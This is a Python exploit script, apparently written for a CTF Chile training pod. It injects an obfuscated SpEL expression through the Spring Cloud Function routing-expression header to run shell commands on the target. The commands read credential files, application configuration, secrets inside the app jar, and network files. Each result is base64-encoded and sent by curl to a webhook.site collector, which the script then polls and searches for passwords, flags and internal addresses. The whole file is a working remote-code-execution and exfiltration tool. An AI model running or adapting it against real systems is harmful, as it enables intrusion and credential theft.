#!/usr/bin/env python3
"""
CTF Chile - Extraer archivos de credenciales específicos
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Extrayendo archivos de credenciales críticos...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] EXTRAYENDO archivos de credenciales específicos...")

# Extraer archivos críticos encontrados
probe("jmx_password_template", "cat /opt/java/openjdk/conf/management/jmxremote.password.template")
probe("debconf_passwords", "cat /var/cache/debconf/passwords.dat")

print("[*] EXTRAYENDO configuración de la aplicación Spring...")

# Extraer configuración de la aplicación
probe("spring_application", "cd /tmp && unzip -o /app/app.jar 'application*' 'bootstrap*' '*.properties' '*.yml' 2>/dev/null && find . -name 'application*' -o -name 'bootstrap*' -o -name '*.properties' -o -name '*.yml' | head -10 | xargs cat")

print("[*] BUSCANDO otros archivos de configuración...")

# Buscar otros archivos de configuración
probe("app_jar_props", "strings /app/app.jar | grep -E '(password|secret|key|credential|admin|root)=' | head -10")
probe("vault_config", "find /app -name '*vault*' -o -name '*config*' 2>/dev/null | head -5 | xargs cat 2>/dev/null")

print("[*] VERIFICANDO archivo hosts y DNS...")

# Verificar archivos de red
probe("hosts_file", "cat /etc/hosts")
probe("resolv_conf", "cat /etc/resolv.conf")

time.sleep(12)

# Recoger y analizar respuestas
print("\n[*] Analizando archivos extraídos...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=15", timeout=10)
data = r.json().get("data", [])

jmx_creds = []
app_config = []
important_data = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Analizar contenido específico
            if "jmx" in path.lower():
                if any(keyword in decoded.lower() for keyword in ["password", "role", "user", "="]):
                    jmx_creds.append((path, decoded))
                    print("🔑 CREDENCIALES JMX ENCONTRADAS")

            if "application" in path.lower() or "spring" in path.lower():
                if len(decoded.strip()) > 10:
                    app_config.append((path, decoded))
                    print("⚙️ CONFIGURACIÓN DE APLICACIÓN")

            if any(keyword in decoded.lower() for keyword in ["ctfchile{", "flag"]):
                important_data.append((path, decoded))
                print("🚩 POSIBLE FLAG O DATO IMPORTANTE")

            if any(keyword in decoded.lower() for keyword in ["10.160", "10.109", "ssh", "admin"]):
                important_data.append((path, decoded))
                print("🔗 INFORMACIÓN DE RED/ACCESO")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen
print("\n" + "="*60)
print("📋 RESUMEN DE EXTRACCIÓN")
print("="*60)

if jmx_creds:
    print(f"🔑 CREDENCIALES JMX: {len(jmx_creds)}")
    for path, content in jmx_creds:
        print(f"    - {path}: {content[:100]}...")

if app_config:
    print(f"\n⚙️ CONFIGURACIÓN DE APLICACIÓN: {len(app_config)}")
    for path, content in app_config:
        print(f"    - {path}: {content[:100]}...")

if important_data:
    print(f"\n📌 DATOS IMPORTANTES: {len(important_data)}")
    for path, content in important_data:
        print(f"    - {path}: {content[:100]}...")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")